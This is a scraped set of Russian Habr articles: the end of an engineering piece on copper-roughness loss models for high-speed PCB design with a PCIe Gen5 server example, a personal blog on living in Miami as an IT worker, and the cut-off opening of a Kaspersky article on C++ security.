нужна теория) и модели, которые выводятся из фундаментальной физики (наподобие уравнений Максвелла). Феноменологические модели не имеют под собой физического базиса практически по определению, но они все равно могут выдавать приемлемый в контексте поставленной задачи результат.Сразу зададим себе вопрос: что считать «приемлемой» моделью? Ранее мы увидели, что ошибки на любом этапе проектирования (в том числе на этапе моделирования и характеризации) имеют свою цену. Оказывается, что критерии «приемлемости» сводятся к балансу рисков, и в итоге — к специфике проекта. Например, в дизайнах в которых нет ничего быстрее PCIe Gen3, многое из того, о чем идет речь в статье, часто вообще не нужно. Риск можно измерить в деньгах и рассчитать по формуле [вероятность события]*[финансовые потери при его возникновении]. На другой чаше весов — время, которое, как известно, тоже достаточно прямолинейно конвертируется в деньги.Специфику нашего воображаемого кейса мы уже обозначили в предисловии, теперь настал момент зафиксировать, как она будет влиять на выбор модели. Условимся на следующем:Мы не хотим проводить раннюю характеризацию материалов и структур, то есть делать это до заказа первых образцов разработанного модуля на фабрике.Отсюда следует, что у нас нет роскоши использовать модели, которые сильно полагаются на «подгонку» коэффициентов и параметров, чтобы соответствовать результатам измерений.Желательно, чтобы в модели использовались параметры, доступные документации на фольгу и/или химию (техпроцессы), используемые на целевой фабрике. А именно — одно или более из следующего:Ra — среднее арифметическое значение профиля z(x,y),Rq — среднеквадратическое значение профиля z(x,y),Rz — средняя разница между самой глубокой впадиной и самым высоким пиком профиля, которая обычно берется по 10 «худшим» точкам,RSAI — характеристика соотношения площадей реальной и идеальной поверхностей.Теперь наконец приступаем к разбору популярных моделей.Применимость моделейВсе модели неверны, но некоторые полезны. All models are wrong, but some are useful.Эта цитата британского статистика Джорджа Бокса изначально касалась только статистических моделей, но ее можно смело применять для феноменологических. Если свести в таблицу популярные и полярно разные модели и параметры, которые им нужны на вход, получим следующее:МодельВходные параметрыСложность примененияОткуда брать параметрыДостоверность результатовHammerstadRqНизкаяТаблица данных на техпроцесс/материалы или SEM-профильЗависит от конкретных случаевHuraySEM-снимокВысокаяSEM-профильВысокаяCannonball-HurayRzНизкаяТаблица данных на техпроцесс/материалы или SEM-профильЗависит от конкретных случаевПолучение SEM-изображения не всегда оправдано с точки зрения затрачиваемых на эту процедуру средств, поэтому SEM-изображения у нас часто не будет. А даже если будет, то применение Hurray-модели в чистом виде все равно останется не самой тривиальной задачей: профиль впоследствии придется разложить на суперпозицию сфер, что само по себе значительно сложнее, чем получение Rz или Rq из z(x,y).При отсутствии данных о профиле фольги z(x,y) среди рассмотренных ранее моделей применимыми остаются только две: модель Хаммерстада и модель Cannonball-Hurray. Обе основаны на допущениях, у обеих есть пределы применимости. Чтобы принять решение, какую и когда использовать, надо рассмотреть, что за допущения существуют для каждой модели и каковы их последствия. Модель HammerstadВ случае модели Хаммерстада все сводится к одному параметру — Rq, среднеквадратическому от профиля z(x,y) по некоторой области образца.Она основывается на еще более старой модели Моргана 1949 года, которая строится на предположении о том, что высокочастотный ток за счет скин-эффекта течет «вдоль» зазубренной поверхности, где зазубрины, как тогда предполагалось, достаточно хорошо описывают профиль шероховатой фольги. Зазубрины в модели Моргана появились не просто так — речь тогда шла буквально о выцарапанных ножом зазубринах на поверхности экспериментального образца. В оригинальной статье исследуются не только пилообразные зазубрины, но именно они перекочевали в модель Хаммерстада.Очевидный недостаток модели Моргана в том, что в реальной жизни ток совершенно не обязан течь перпендикулярно зазубрине, да и шероховатой медь на заводе делают далеко не ножом. Модель Хаммерстада решила эту проблему на удивление просто: она подразумевает, что z(x,y) не зависит от поворота системы координат вокруг Oz, то есть профиль всегда (в любом направлении) выглядит как на иллюстрации ниже:Теперь внимательно присмотримся к «математике Хаммерстада»:где:f — нормированная на 1 Гц частота,Rs — аттенюация на гладкой поверхности,Rac — аттенюация на шероховатой поверхности,Kh — коэффициент Хаммерстада,δ — глубина скин-слоя,Rq — среднеквадратическое отклонение от плоской поверхности.Арктангенс во втором выражении, являющемся коэффициентом Хаммерстада, доберется до π/2 тем быстрее, чем выше Rq и чем выше частота (поскольку это означает малый скин-слой δ). Мы получаем картину, при которой с ростом частоты влияние шероховатости на вносимые потери ослабевает: потери становятся пропорциональны квадратному корню частоты (см. первое выражение), а чувствительность потерь к изменениям частоты уменьшается, в пределе стремясь к нулю. Это контринтуитивно и не соответствует наблюдениям. Условная граница применимости модели Хаммерстада: f < 4 ГГц и Rq < 5 мкм.Можно ли расширить эту условную границу? В 2011 году Юрий Шлепнев et al. в своей работе ""Roughness Characterization for Interconnect Analysis"" показал, что это возможно. Мотивация для написания этой статьи хорошо описана в одном из последних предложений введения:Для расширения применимости модели Hammerstad к поверхностям с различными профилями шероховатости может потребоваться простая эвристическая модель. A simple heuristic model may be needed to extend the applicability of the [Hammerstad] model to surfaces with different roughness profiles.Так родилась модифицированная модель Хаммерстада. Есть, впрочем, нюанс, который станет ясен после чуть более детального рассмотрения самой модели.Суть модифицированной модели Хаммерстада заключается в видоизменении коэффициента Kh. Теперь он выглядит так:Новый параметр RF характеризует максимальное увеличение потерь в проводнике за счет эффектов шероховатости. Именно такое математическое представление было, по всей видимости, вдохновлено формами графиков измеренной частотной зависимости потерь и предсказанной оригинальной моделью.Первая попытка придать новоиспеченной модели физический смысл основывалась на предположении, что RF также может быть измерен механически как среднее увеличение пути вдоль шероховатой поверхности по сравнению с плоской поверхностью (""RF can also be mechanically measured as the average increase in path along the rough surface as compared to a flat surface""). Попытка оказалась провальной, а об остальных мы не осведомлены, даже если они были. Попытка же подогнать (намеренно без кавычек) коэффициенты, чтобы получить хорошее схождение графиков, оказались успешнее.«Нюанс» в итоге заключается ровно в том, что без проведения измерений (характеризации) ключевой параметр данной модели — RF — остается в серой зоне. Получить его можно либо методом проб и ошибок, либо за счет проведения ранней характеризации отдельных образцов материалов, прошедших к тому же через целевой техпроцесс. Статистику и допуски пока оставляем за скобками.Резюмируя, модель Хаммерстада имеет ограниченную применимость, а ее модифицированные мутации используют неизвестные и во многом абстрактные параметры. В некоторых случаях эти модели полезны, но мы ими не пользуемся.Модель HurayМодель Cannonball-Hurray рассмотрим начиная с оригинальной (Hurray). В течение долгого времени индустрия комфортно жила с моделью Хаммерстада. Конечно, человечество давно разрабатывает электронику с частотами, превышающими 70 ГГц, но в мире высокочастотного аналога с очевидно более развитой культурой характеризации всегда можно было «подогнать» коэффициенты модели к результатам измерений и в целом позволять себе выделять время для подобных активностей.В мире HSD (High Speed Digital) стараниями некоторых крупных представителей индустрии высокоскоростные интерфейсы долгое время в массе своей стагнировали. Для разработки устройств с условным PCIe можно было обходиться вообще без учета шероховатости либо номинально использовать модель Хаммерстада, причем без всяких модификаций. Частоты интереса составляли всего лишь 4 ГГц, а типичные (если специально не указывать тип фольги в техтребованиях) Rq — порядка 7-12 микрон. Как мы ранее выяснили, модель Хаммерстада даже здесь уже показывает расхождения с реальными измерениями, но их влияние на работу изделий вычислительной техники оказывалось пренебрежимо малым.С приходом в индустрию технологий PCIe Gen4 и Gen5 (8 и 16 ГГц, соответственно) появились и новые вызовы, и в качестве ответов на них — новые модели, объясняющие потери, обусловленные шероховатой поверхностью проводника в совершенно ином ключе. Пол Хурей в своей книге под названием ""The Foundations of Signal Integrity"" и впоследствии — в рамках выступления на DesignCon 2010 с темой ""Impact of Copper Surface Texture on Loss: A Model that Works"" предложил модель, названную в честь ее автора — Модель Хурея (Huray Model). Рассмотрим вкратце, почему, по мнению Хурея, модель Хаммерстада нежизнеспособна и что именно Хурей предложил в качестве альтернативы.Одним из существенных недостатков модели Хаммерстада являлось и является отсутствие физического базиса. Этот недостаток и основополагающее предположение модели о том, что высокочастотный ток «проделывает более длинный путь по неровной поверхности», в конечном итоге можно использовать, чтобы доказать теоретическую несостоятельность модели. Ниже приведен ранее фигурировавший здесь рисунок пилообразного профиля медной фольги. Представим, что в направлении оси Ox распространяется электромагнитная волна и обозначим на нем следующие величины:E — напряженность электрического поля.Σ — поверхностная плотность электрического заряда.c — скорость света в вакууме.v — скорость «перемещения заряда» вдоль поверхности проводника.Условимся, что диэлектрическая постоянная среды распространения у нас равняется четырем, тогда скорость распространения электромагнитной волны в среде будет в 2 раза (√4) меньше скорости света в вакууме. Магнитную составляющую волны иллюстрировать не будем, чтобы не захламлять рисунок.В соответствии с теоремой Гаусса, чем больше напряженность электрического поля, тем больше должна быть плотность поверхностного заряда Σ. То есть для поддержки переменного электрического поля поверхностный заряд вдоль неровной поверхности меди должен перераспределяться, что, казалось бы, соответствует протеканию тока вблизи поверхности проводника. Не будем, однако, забывать, что в нашем случае электромагнитная волна распространяется в среде со скоростью c/2, тогда как мы все еще считаем, что ток течет по более «длинному» пути. Возникает несостыковка. Мы получаем, что:Скорость перемещения заряда вдоль поверхности проводника v должна превышать скорость света в среде.Эта же скорость v может запросто превысить скорость света в вакууме, если взять достаточно шероховатую поверхность и/или среду с достаточно низкой диэлектрической проницаемостью.Этот и ряд других доводов Хурей счел достаточными, чтобы поставить крест на модели Хаммерстада. Модель, предложенная Хуреем взамен, строится вокруг теории поглощения и рассеяния электромагнитных волн сферическими проводниками в вакууме проводящими сферами. Хурей в своем рассмотрении считал, что энергия электромагнитного поля поглощается и рассеивается проводящими сферами и именно эти процессы обуславливают потери на неровной поверхности проводника, которая, как несложно догадаться, в модели Хурея выглядит как множество проводящих сфер. То есть примерно как на следующем рисунке:Если присмотреться к типичному SEM-снимку, на нем и правда можно увидеть множество сфер и представить, что неровности описываются определенной конфигурацией этих самых сфер:Типичное SEM-изображение фольги перед прессованием. Источник, слайд 13.Кроме того, Хурей et. al. при помощи Оже-спектроскопии выяснил, что поверхности медных сфер покрыты пленкой, в которой присутствуют углерод, кислород, кремний и немного никеля. Из этой находки последовал вывод о том, что заряд в индивидуальных сферах можно считать изолированным и что проводимость между сфер относительно невелика.Далее необходимо вычислить сечение поглощения и рассеяния для данной конфигурации сфер. Хурей решает эту задачу рассеяния (scattering problem) методом парциальных волн, который сложно объяснить простыми словами. Результатом решения этой задачи становятся сечения поглощения и рассеяния. Каждая из этих величин показывает, какая доля энергии приходящей волны была «потрачена» на соответствующие взаимодействия. «Потрачена» — не самое верное слово для рассеяния, но Хуррей показывает, что на частотах ниже 100 ГГц рассеянием можно пренебречь. Что и делаем.Итоговое выражение, характеризующее долю потерь энергии, обусловленную шероховатостью, получается следующим:где:Ni — число сфер с радиусом ri в пределах шестиугольной области поверхности проводника с площадью Ahex (шестиугольник выбран произвольно и не влияет на итоговый результат),δ — глубина скин-слоя,Ahex — площадь условно элементарной ячейки (в данном случае — шестиугольника), к которой мы вскоре вернемся.Теперь попытаемся свести все допущения, лежащие в основе модели и оценить ее применимость для «кейса в вакууме». Итак:Неровности на поверхности меди должны быть похожи на множество сфер. Справедливо для технологических процессов из 2000-х годов, но может быть несправедливо для так называемых ""low etching"" процессов, которые хочется использовать в действительно высокоскоростных дизайнах (112/224 ГТ/c PAM4 и более).Проводящие сферы должны быть изолированы друг от друга, то есть должно быть верным предположение о непроводящей (или плохо проводящей) пленке, покрывающей сферы. Иными словами, взаимодействие сфер должно быть достаточно незначительным, чтобы им пренебречь.Ряд допущений, описанных самим Хуреем, заключается в игнорировании эффектов второго порядка. Им же было показано, что вклад этих эффектов составляет не более 6%, то есть часто является пренебрежимо малым.Хурею удалось экспериментально подтвердить свою модель, хоть это и тяжело проверить самостоятельно. В статье ""Impact of Copper Surface Texture on Loss: A Model that Works"" приводятся изображения поверхности проводника в изометрии и рядом — графики, где предсказания модели очень хорошо совпадают с измерениями. Также приведены параметры, поданные на вход модели, — радиусы и число сфер. Мы не пытались посчитать число сфер и их радиусы по фотографии, оставив валидность модели Хурея вопросом веры.Модель Хурея ценна за счет следующих обстоятельств:В отличие от модели Хаммерстада, она не основывается на неверных (и даже местами наивных) представлениях о поведении электромагнитных волн.Показано, что при помощи модели можно достаточно точно оценивать вклад шероховатости в потери в широком диапазоне частот (вплоть до 50 ГГц и выше).Чтобы облегчить применение модели, Хурей предлагает еще одно упрощение — ""Uniform snowball model"", или «Модель одинаковых сфер». Суть заключается в следующем:Выделяем на SEM-снимке некую повторяющуюся (в плане числа и распределения сфер) область.Вычисляем средний радиус сфер в рамках выделенной области.Выбираем число сфер в области так, чтобы можно было этим числом сфер примерно воспроизвести неровности поверхности проводника.При желании можно не прибегать к вычислению среднего радиуса сфер. Например, имеет смысл использовать в расчетах два вида радиусов, если соответствующие сферы явно выражены на снимке. Также стоит отметить, что Хурей в качестве «области» использовал шестиугольник, поскольку эта форма соответствовала имеющимся у него снимкам. Однако, в теории, конкретная форма на конечный результат влиять не должна.Модель Cannonball-HurayДвигаемся дальше по спирали упрощений. Мы уже упоминали, что не у всех и не всегда есть возможность получить SEM-снимки и выискивать похожие на них объекты на сфере. Перечитаем еще раз Хурея и предположим, что неровности поверхности проводника выглядят как шестиугольные пирамидки. Также вспомним одно любопытное обстоятельство — наивысшая плотность упаковки сфер достигается при так называемой гексагональной плотноупакованной решетке. Совпадение? Инженер-технолог Берт Симонович так не думает.Исходя из чисто геометрических соображений, Симонович предлагает в качестве отправной точки подавать на модель Хурея параметры, связанные с параметрами фольги, которые можно найти в документации на фольгу и/или техпроцесс по ее обработке, следующим образом: где:N — число сфер с радиусом r,Rx — или Ra , или Rz; в оригинальной статье отсутствует внятное объяснение, от чего в рамках используемой модели зависит выбор одного или другого,Ahex — площадь основания шестиугольной пирамиды, которая формируется из этих сфер.Ранее приведенное уравнение Хурея с этими допущениями вырождается в следующее:Очевидно, что с ранее обозначенными предположениями о связи r и Ahex с Ra или Rz можно, как утверждает автор модели, оценить влияние шероховатости на потери на основании только лишь соответствующих параметров, которые обычно вполне себе доступны, так как легко поддаются измерению.Если выражаться максимально политкорректно, модель Симоновича как бы говорит: «Если не знаете параметров для модели Хурея, возьмите вот эти, конкретные». Излишне говорить, что его подход вызывает немало вопросов. Также неудивительно, что, помимо вопросов, модель также притягивает немало критики.Пожалуй, единственным достоинством модели является ее простота. Скорее всего, эта простота обманчива, но решение о ее применении принимается «по месту» — на основании оценки цены ошибки в каждом конкретном случае. То же самое можно сказать про любую другую модель. Что действительно важно понимать перед принятием решения, так это (как обычно) тяжесть последствий этого решения.Практический примерТеперь рассмотрим простой, но показательный кейс со следующими вводными:Задача — спроектировать серверную материнскую плату под применение в «типовом» rack-сервере.Целевой процессор поддерживает PCIe Gen5 (более правильно — скорости передачи до 32 ГТ/с).К одному из PCIe-портов процессора нужно подключить сетевую карту 400 GbE в форм-факторе OCP 3.0 (например, 900-9X7AX-004NMC0 от NVIDIA) и, естественно, иметь возможность полностью реализовать ее потенциал.Компоновка (floorplan) современного сферического сервера в вакууме, скорее всего, будет выглядеть, как показано на приведенной ниже диаграмме. Такая компоновка обусловлена многими факторами, среди которых присутствуют эффективность доставки электропитания до периферии и охлаждение. Эти нюансы мы пока что оставим за скобками. Райзеры и SMP-шины для чистоты изложения не показаны.Компоновка современного сферического сервера в вакууме.Интересующий нас тракт специально выделен красным в бесцветной диаграмме. В спецификации PCIe фигурирует (причем даже не в качестве нормативного) значение потерь на включение от бампа кристалла передатчика до кристалла приемника. Поэтому интересующий нас тракт начинается на подложке и заканчивается на подложке, охватывая не только платы и коннекторы. Имея представление о внутренней компоновке разрабатываемого устройства, мы можем приступать к декомпозиции потерь в высокоскоростном тракте. С учетом подложек корневого комплекса (здесь и далее — RC, или Root Complex) и оконечной точки (здесь и далее — EP, или Endpoint), получаем следующую, все еще упрощенную декомпозицию тракта:Далее, вооружившись релевантными спецификациями (PCIe Base Specification, SFF-TA-1002, OCP 3.0 NIC), составляем пессимистичную картину потерь в тракте. Без характеризации элементов тракта у нас нет оснований пользоваться иной:СегментПотери в сегменте, дБПримечаниеTL0-9п. 8.3.6 Базовой Спецификации PCIeTL1≥ -11Сегмент выхода из-под процессора (pinfield/neck) и основной сегмент (main). Предположим, что общая длина обоих сегментов не превышает 10 дюймов. Чаще всего это соответствует действительности.CN0 + CN1-1Таблица 5-5 Спецификации SFF-TA-1002.TL2 + TL3-7Таблица 59 документа ""OCP NIC 3.0 Design Specification"".N/A-4Запас на температурные вариации Dk, Df, проводимости меди и прочего.N/A-4Запас на эффекты, связанные с отражениями, перекрестными помехами и джиттером.Итого≥ -36Номинальное значение потерь на включение для калибровочного канала, который используется для валидации ресивера. А вообще в явном виде базовая спецификация PCIe этой цифры не предоставляет.Далее наступает момент, когда нам необходимо начинать более углубленное планирование топологии и расчет стека. Часто в этом деле помогают референс-дизайны, но не всегда. И более того — иногда авторы референсов принимают откровенно сомнительные решения, которые могут приводить к не самым приятным последствиям. Из-за NDA расписать не получится, но глобальный посыл прост: критическое отношение, в частности, к референсам является необходимым условием для принятия ответственных решений.Некоторые читатели могут быть знакомы со статьей, которая рассказывает, как мы считали стеки в далеком 2017 году. Описанная в статье методика во многом актуальна с тем лишь дополнением, что в процесс добавляется статистический анализ разрабатываемых конструкций. Иными словами, мы теперь чаще и более осознанно стремимся делать стеки, слабо подверженные влиянию таких фаз Луны, как температура, усадки препрега, допуск на подтрав и прочих. Также не стоит забывать, что универсальных решений для каждого случая не существует. К примеру, пытаясь минимизировать потери на включение, мы усугубим проблему перекрестных помех, причем порой в самых неожиданных местах. Например, если у DDR отражения из-за низкого Df материала затухают «долго», DDR'у то этого только поплохеет, хотя мы всего лишь пытались облегчить жизнь шине PCIe.Предположим, что одним из итогов длительного и нелегкого процесса конструирования стека стала следующая геометрия 85-омной дифференциальной пары:Далее мы практически априори знаем, что нам нужна низкая шероховатость. Это означает одно или более из следующего:В технических требованиях на плату будет фигурировать HVLP/VLP-фольга и конкретное значение как минимум одного ключевого и измеримого параметра шероховатости фольги ( Rq, Rz, RSAR или RSAI).В технических требованиях на плату будет присутствовать требование использовать специализированную химию, чтобы изменения оригинального профиля фольги были минимальны.Если фабрика соблюдает указанные технические требования, то ожидаемые SEM-снимки меди до и после процессов подготовки к нанесению фоторезиста и подготовки к прессованию будут выглядеть ориентировочно следующим образом:Хорошим показателем качества используемой химии является финишный RSAI или RSAR. Этот показатель является характеристикой соотношения площади реальной поверхности (или правильнее сказать дельты) к площади гладкой поверхности. Вычисляется следующим образом:Для условно качественной химии этот показатель находится между 0.2 и 0.3. Для HVLP меди до обработки — порядка 0.08-0.1 со стороны препрега.Подобного рода SEM-изображения дают чуть больше уверенности в применимости модели Cannonball-Hurray, даже несмотря на ее ограничения. Поэтому, и отчасти за неимением альтернатив без характеризационных данных, используем ее. В том же софте, в котором считали стек и геометрии TL, организуем небольшой сетап для условно «лучшего» и условно «худшего» случаев. Описание сетапа примерно такое:КейсШероховатость на стороне ядра Rz, мкмШероховатость на стороне препрега Rz, мкмДлина линии передачи, milПредположительно «лучший»225000Предположительно «худший»255000Напомним, что единственным параметром Cannonball-Hurray после всех допущений остается Rz изучаемой поверхности.В итоге для «лучшего» и «худшего» случаев получаем следующие результаты:Здесь уже можно формировать требования к предельно допустимому финальному Rz. Вспомним, что ранее мы ограничили себя максимальной длиной диффпары, равной 10 дюймам, и что контролируемые нами потери не должны быть хуже -11 дБ. Получаем, что предельные погонные потери составляют 1.1 дБ/дюйм. В нашем случае это значение погонных потерь примерно соответствует шероховатости 3 мкм Rz. При формировании реальных технических требований мы, конечно, не используем примерные значения, но они прекрасно подходят для иллюстративных целей.Следующими большими задачами будут валидация дизайна силами QA и параллельно — характеризация линий передач на полученных платах на специализированных купонах, которые формируются на тех же производственных заготовках, что и сами платы. Данные характеризации послужат для уточнения используемых моделей. В дальнейшем это позволит более точно формировать технические требования, принимать более осознанные решения при дизайне PCB, уменьшать неопределенность расчетов и в конечном итоге — достигать более эффективных с точки зрения бизнеса результатов (потенциально дешевле, быстрее, с меньшим риском ошибиться).Характеризация линий передачи на частотах порядка 16 ГГц — достаточно сложная тема, являющаяся предметом отдельного детального рассмотрения. Если вам интересно почитать о ней, дайте знать в комментариях.",2024-01-26
Майами глазами айтишника,22,1,https://habr.com/ru/companies/raft/articles/789008/,"После того, как я написал свое мнение о жизни в Сан-Франциско, многие стали присылать мне вопросы о других городах. ""Я неисправимый романтик"", - сообщает один читатель, - ""и верю что где-то на земле всё-таки есть рай. А как насчет Майами? Я играл в GTA Vice City в детстве, и там все выглядело весьма неплохо"".Если хотите узнать мое полностью предвзятое мнение - читайте дальше.Суммарно я провел в Майами почти год и знаю его довольно хорошо. Настолько хорошо, что часто оказывалось что я знаю его лучше многих местных (но только потому, что они ленивые задницы и редко выбираются из своих районов).Мне нравится Майами. Из всех больших городов США я бы выбрал именно его для жизни, несмотря на все его недостатки (а их очень много). Но я такой человек, который любит жару и не устает от палящего солнца. Когда наши люди представляют Америку - они на самом деле представляют себе либо Нью-Йорк либо Майами. Это то, что Голливуд обычно показывает в своих фильмах. Тут много небоскребов и дорогих машин, и издалека город выглядит футуристично, что может показаться что здесь живут небожители, продвинутые в технологиях и решающие дифференциальные уравнения на завтрак, в уме. Но так ли это?Давайте не будем забегать вперед и посмотрим, что к чему.Начнем с того, хорош ли Майами и как он сравнивается с другими крупными городами США?Да, он действительно хорош:Давайте начнем с погоды. Здесь всегда тепло, даже в январе, самом холодном месяце, средняя температура выше 18 градусов. Здесь солнечно и зелено. В воздухе разлит аромат цветов, океана и экзотической еды. Не нужно много одежды, фактически, вам нужны только шорты и пара шлепанцев.Из-за солнечной погоды люди очень энергичные и жизнерадостные, здесь нет постоянного ощущения депрессии в воздухе, как в Сиэтле. Люди улыбаются и разговаривают друг с другом на улицах, что необычно и пугает социопатов из айтишных штатов.Еда хорошая. Не великолепная, давайте будем реалистами - мы говорим об Америке, но она хорошая. Есть много отличных мест с разнообразной латиноамериканской едой, веганской едой и морепродуктами. Местные сети, такие как Pura Vida, предлагают отличную здоровую кухню по разумным ценам (привет, Калифорния).Здесь относительно чисто и безопасно. Конечно, не так безопасно, как в Европе. Ни один крупный город США не является полностью безопасным местом, но для такого большого города, как Майами, здесь довольно хорошо. Можно гулять в центре города после 18:00, и не быть ограбленным или убитым. Атмосфера вокруг не выглядит как сцена из ""Бегущего по лезвию"". Здесь чисто, новые здания и фасады в хорошем состоянии. Есть очень безопасные и богатые районы, такие как русско-еврейский район Санни-Айлс, где небоскребы тянутся вдоль пляжа насколько хватает глаз, или северо-средняя часть Майами-Бич со всеми ее дорогими отелями и яхтами. Есть уютные и тихие районы, такие как район старых особняков Коконат-Гроув. Есть живые и современные районы, такие как Авентура. Есть район для каждого. Полиция действительно старается поддерживать порядок, например, обеспечивая безопасность и убирая бездомных с тротуаров. Флорида никогда не присоединялась к идиотскому движению ""defund the police"", поэтому, естественно, полиция есть и она выполняет свою работу.Майами-БичПлощадь в районе Даунтауна. Мусора нет Здесь всегда есть чем заняться. На самом деле, занятий так много, что вряд ли у вас хватит времени на все, и вас будет постоянно терзать сожаления что вы что-то не успели. Майами-Бич (который технически является отдельным городом) никогда не спит, вечеринки идут круглосуточно. Если вы любите музыку - тут постоянно проходят музыкальные фестивали самых разных жанров. Майами является одним из центров медиа индустрии, сюда постоянно приезжают топовые диджеи. Музеи, художественные галереи, спортивные мероприятия и так далее - что-то всегда происходит.Люди хорошо выглядят и хорошо одеваются. Если в Сан-Франциско трудно отличить технаря на третьей неделе дедлайна проекта от бездомного, то в Майами люди спортивны, ухожены и носят одежду, которая им действительно подходит (по размеру).Пляж. Я выделяю его в отдельную категорию. Есть множество пляжей на любой вкус. Есть длинный, переполненный туристами пляж Майами-Бич и более приятный пляж Key Biscayne с большим парком и живописным маяком. Есть частные пляжи без людей и так далее. Чистая голубая вода и большое голубое небо над головой. Все это выглядят захватывающе на закате. И природа вокруг тоже очень красива.Рассвет на Майами БичПарк Key BiscayneЗдесь не так дорого, как в других больших городах. По сравнению с Нью-Йорком или Сан-Франциско - все очень доступно. И нет налога на доходы физических лиц штата. Жилье достойное, в основном это квартиры в высотных зданиях с удобствами вроде бассейнов и тренажерных залов.Настоящие кубинские сигары (а что такого?).Я могу говорить о преимуществах Майами очень долго.. Есть много причин, почему вам стоит собрать вещи прямо сейчас и немедленно переехать во Флориду. Но стоит ли?У Майами есть и темная сторона, и это место может не подходить многим людям. Давайте начнем с погоды:Тут жарко. Или позвольте мне выразиться так: чертовски жарко. Летом так жарко, что кажется, будто живешь в сауне. Июнь, июль и август - месяцы массовой миграции из Флориды, так как становится невыносимо. Мозг тает от этой жары очень быстро, и даже короткая прогулка на улице может привести к сердечному приступу. Из-за высокой влажности умеренные 30 градусов чувствуются как 100.Не знаю, это жара заставляет людей сходить с ума, или что-то добавляют в воду, но люди могут быть слишком энергичны, до степени, иногда раздражающей. Они могут быть грубыми, настырными или просто сумасшедшим. Вы сразу заметите это на дорогах - они полны маньяков, которые ездят так, словно у них в машине бомба, которая взорвется через 60 секунд. Водители играют в шашки, сигналят и часто кричат на мешающих пешеходов. А пешеходы не лучше - красный свет для них здесь скорее рекомендация, чем закон. Вообще у многих водителей в принципе нет прав.На пляже будьте готовы к тому, что вас будут постоянно донимать люди, предлагающие пиво, траву и прочее, а если вы женщина, то я вам не завидую - к вам будут постоянно клеится мимо проходящие представители мужского пола с неоднозначными намерениями.На самом деле, безумные вещи происходят так часто, что во Флориде даже придумали специальный термин для этого - ""Florida Man"":Заголовки новостейМайами - это вторая Силиконовая Долина, хотя это другой вид силикона, если вы понимаете, о чем я. Это столица разного рода решал, темщиков, инфобиза и четких пацанчиков. Огромное количество народу пытается заработать здесь и сейчас и желательно прилагая как можно меньше усилий. Здесь очень много поверхностных, претенциозных, богатых и показных людей, одержимых своим внешним видом и имиджем превыше всего. Или дорогой одеждой, дорогими машинами, дорогими клубами и другими понтами. Это место очень пафосное, особенно в туристических районах. Есть немало ограниченных индивидуумов, которые пытаются самоутверждаться за счёт других. Мне говорили, что если прожить в Майами достаточно долго, это может вызвать постоянный понтоз головного мозга, и после этого помогает только лоботомия. Это, возможно, самое пафосное место во всей Америке, за исключением Манхетенна и Лос-Анджелеса. С таким количеством денег, которыми здесь разбрасываются и понтуются, это место буквально меняет людей, и часто не в лучшую сторону.Есть районы, куда лучше не ходить, так как они довольно опасны даже днем. Однажды моего друга, который бегал трусцой одним тихим вечером в таком районе на окраинах города, остановил полицейский на машине и добровольно-принудительно сопроводил в отель, из-за высокой вероятности что мой беспечный друг мог быть зарезан насмерть, если бы попытался вернуться назад пешком (как случилось, по словам этого представителя безопасности, ровно ночь назад). Так что не все здесь безопасно и благополучно.Такое тоже естьЗдесь нечего делать. Я знаю, это может показаться странным с учётом того, что я говорил ранее, но послушайте меня. Тут много развлечений, но не так много работы и бизнеса, если вы не в сфере туризма, недвижимости или моделинга на Onlyfans. Здесь нет IT, несмотря на все попытки местного правительства привлечь технарей в город, и нет технологических компаний. Нет технологического комьюнити, мало хороших митапов и конференций. Вам в основном придется ограничиться удаленной работой и самим собой. Если вы в IT - это вариант, но если нет - вам не повезло. Другие работы оплачиваются не очень, и даже их трудно найти.Здесь довольно сложно сосредоточиться на работе с вечеринками и всем, что происходит вокруг. Я имею в виду, вы можете смотреть в экран своего ноутбука весь день или на это снаружи:Просто посмотрите на этот красивый океанЕще несколько фотографий красивого пляжа и океанаКак видите, требуется железная воля, чтобы работать в таких тяжелых условиях.Многие люди не говорят по-английски. Поскольку испаноязычное сообщество здесь так велико (более 60% населения Майами), им это и не нужно. Если вы белый - вы здесь в меньшинстве. Так что лучше немного выучить испанский, иначе во многих местах к вам будут относиться не так благожелательно как вы этого ожидаете.Цены на жилье удвоились за последние два года, так как многие люди переехали во Флориду с ковида, так что теперь не так-то просто найти хорошее место по разумной цене.Везде безумные туристы. Если вы живете на Майами-Бич, Брикеле или в других туристических районах, будьте готовы терпеть шумных, грубых и пьяных людей. Они кричат ночью, занимаются сексом в кустах возле вашего дома и предаются всевозможным поведениям, которые кажутся забавными пьяному 18-летнему подростку, только дорвавшемуся до алкоголя и хвастающемуся перед друзьями. Во время весенних каникул начинается бедлам на стероидах, и пляжи так переполнены что яблоку негде упасть.Весенние каникулыУраганы и наводнения. Да, они тут бывают и с завидной периодичностью. Есть официальный сезон ураганов (осень). Затопляет целые районы что приводит к перебоям с поставками топлива и других товаров. Тонут целые гаражи с автомобилями, в город приносит аллигаторов, которые потом разгуливают по улицам. И каждый раз реакция коммунальщиков одна и так же - никогда такого не было и вот опять. Так что не только у нас так.Так что, несмотря на большое количество небоскребов, в Майами нет IT, нет венчурных капиталистов, кроме крипты (если вы верите в крипту), но и в криптовалютах в основном трейдеры и мошенники, а не разработчики. Люди вокруг мало что знают о технологиях, они больше заняты фитнесом, здоровым образом жизни, вечеринками и тем, чья попа больше торчит из шорт. Если вы публично упомянете langchain или полиморфизм, вас могут арестовать за попытку вызвать дьявола. Правительство пытается это изменить и прилагает реальные усилия (они действительно стараются), но пройдет много лет, прежде чем эти усилия принесут плоды. Так что если вы хотите процветающего технологического сообщества прямо сейчас, вам лучше ехать в Нью-Йорк или Сан-Франциско. Тут для айтишников мало карьерных перспектив Опять же, это мое предвзятое мнение. Примите его с долей скептицизма. Мне нравится Майами, правда. И это очень приятное место. Но оно не для всех, нужно любить его, как я, чтобы жить здесь, иначе жизнь тут быстро превратится в кошмар. Если у вас есть вопросы или дополнения - пишите в комментариях.Всем хорошего дня.",2024-01-26
"Действительно ли C++ — лучший язык, чтобы выстрелить себе в ногу?",26,5,https://habr.com/ru/companies/kaspersky/articles/787586/,"В 2023 году одной из главных IT-новостей стала публикация гайда от Агентства национальной безопасности (NSA) США, в котором языки С/C+ признавались «опасными» и требующими перехода на «безопасные» C#, Go, Java, Ruby и Swift. 

В этой статье я с позиции Security Champion в KasperskyOS, собственной микроядерной операционной системе «Лаборатории Касперского», расскажу, так ли плохо обстоят дела с безопасностью в С++ на самом деле, а также разберу различные подходы к митигации описанных проблем, которые современная индустрия предлагает для решения данного вопроса.

Итак, начнем с той самой цитаты от NSA:

